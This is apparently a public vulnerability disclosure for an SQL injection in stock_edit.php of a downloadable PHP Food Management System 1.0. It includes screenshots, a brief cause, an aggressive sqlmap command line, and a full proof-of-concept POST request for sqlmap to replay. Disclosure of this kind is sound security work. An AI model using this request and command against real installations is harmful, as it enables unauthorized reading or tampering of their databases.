###  

### Food Management System SQL Injection Vulnerability

Vulnerability Description: SQL Injection Vulnerability in Foreground of Food Management System 
 Manufacturer Information: [www.kashipara.com/](http://www.kashipara.com/) 
 Affected Version: 1.0 
 Environment: 
 https://www.kashipara.com/project/download/project2/user/2023/202312/kashipara.com_chopstic1-zip.zip 

![img](https://cdn-images-1.medium.com/max/900/1*OVHZZxD7vpNXrFgeB8IeJw.png)

Code Analysis: 
 Code in D:\phpstudy_pro\WWW\chopstic1\stock_edit.php

![img](https://cdn-images-1.medium.com/max/900/1*haPqYSCR-rLWjtdBApVrSQ.png)















 When SQL statements are executed, variables entered by the user are not filtered and validated sufficiently, resulting in malicious SQL statements that can be injected by maliciously constructed inputs.

SQLmap：



![img](https://cdn-images-1.medium.com/max/900/1*IamTiqsxyETu3zyDjJEcFA.png)



















SQLMAP：
python sqlmap.py -r 2.txt --level 5 --risk 3
POC：

```
POST /chopstic1/stock_edit.php HTTP/1.1
Host: localhost
Content-Length: 61
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/chopstic1/stockentry.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; _ga=GA1.1.324136046.1702458922; Hm_lvt_6a3c7d9bb52a48ffadde32007d2a259e=1702459185; _pk_id.1.1fff=4343a030b8a53617.1702459185.; PHPSESSID=l7gqshcet6f2d84e2r3ae4a5tj
Connection: close

id=1&item_type=Ice-Creamaaaaaaa&item_name=1&action=updateStock
```